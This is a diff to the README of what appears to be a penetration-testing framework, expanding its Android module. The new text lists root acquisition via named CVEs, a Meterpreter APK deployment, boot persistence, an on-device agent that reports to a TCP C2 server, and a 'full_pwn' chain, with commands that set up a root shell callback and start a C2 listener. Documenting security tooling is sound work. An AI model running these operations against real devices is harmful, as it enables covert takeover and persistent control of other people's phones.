@@ -176,19 +176,51 @@ run 192.168.1.0/24
 
 ### `android_pentest` — Android Security Testing
 
-Seven operation modes covering the OWASP Mobile Top 10. Static APK analysis, manifest audit, permission review, CVE checks with live NVD lookup, non-ADB attack surface mapping, and exploitation testing.
+Full-lifecycle Android pentesting suite — from passive recon to active exploitation and persistence. Supports rooted and non-rooted devices, ADB over USB and WiFi, multi-device sweeps, and on-device native agent deployment.
 
-| Operation    | Description                                          |
-|--------------|------------------------------------------------------|
-| `recon`      | Device fingerprint, root status, SELinux             |
-| `app_scan`   | APK analysis, manifest audit, security score         |
-| `vuln_scan`  | 50+ checks, OWASP Mobile Top 10, NVD CVEs            |
-| `exploit`    | Intent injection, SQLi, path traversal               |
-| `network`    | Traffic capture, SSL inspection, proxy               |
-| `forensics`  | Data extraction, artifact analysis                   |
-| `full`       | All of the above                                     |
+| Operation         | Description                                                      |
+|-------------------|------------------------------------------------------------------|
+| `recon`           | Device fingerprint, root status, SELinux, chipset                |
+| `app_scan`        | APK analysis, manifest audit, security score                     |
+| `vuln_scan`       | 50+ checks, OWASP Mobile Top 10, NVD live CVEs (incl. MediaTek) |
+| `exploit`         | Intent injection, SQLi, content provider attacks                 |
+| `network`         | Traffic capture, SSL inspection, proxy                           |
+| `forensics`       | Data extraction, artifact analysis                               |
+| `get_root`        | Multi-vector root acquisition (Magisk, adb root, CVE-2024-0044, mtk-su, KernelSU) |
+| `inject_agent`    | Push native recon agent, receive JSON report via TCP C2, auto-escalate |
+| `adb_wifi`        | Enable ADB over WiFi — drop USB dependency                       |
+| `deploy_shell`    | Generate + install Meterpreter APK (no root, bypasses settings)  |
+| `persist`         | Termux:Boot + Magisk module persistence                          |
+| `exploit_cve`     | Targeted CVE exploitation (CVE-2024-0044, CVE-2023-45866, etc.) |
+| `full_pwn`        | Full automated chain: recon → root → shell → persist → WAN       |
+| `multi_device`    | Run any operation across ALL connected devices simultaneously    |
+| `full`            | Full recon + vuln_scan + exploit + network + forensics           |
+
+**On-device agent** (`tools/mobile/android/agent/`):
+- `secv_agent.sh` — shell script, works on any Android without compilation
+- `secv_agent.c` — compiled ARM64 binary (faster, NDK cross-compile via `build.sh`)
+- `c2_server.py` — standalone TCP+HTTP C2 server with interactive REPL
 
 ```bash
+# Basic recon via agent
+use android_pentest
+set operation inject_agent
+set agent_mode recon
+run device
+
+# Full exploitation chain with root shell callback
+use android_pentest
+set operation inject_agent
+set agent_mode exploit
+set escalate true
+set lhost 192.168.1.100
+set lport 4444
+run device
+
+# Run C2 server (separate terminal)
+python3 tools/mobile/android/agent/c2_server.py --auto-exploit --lhost 192.168.1.100 --lport 4444
+
+# Static APK analysis
 use android_pentest
 set operation app_scan
 set package com.target.app
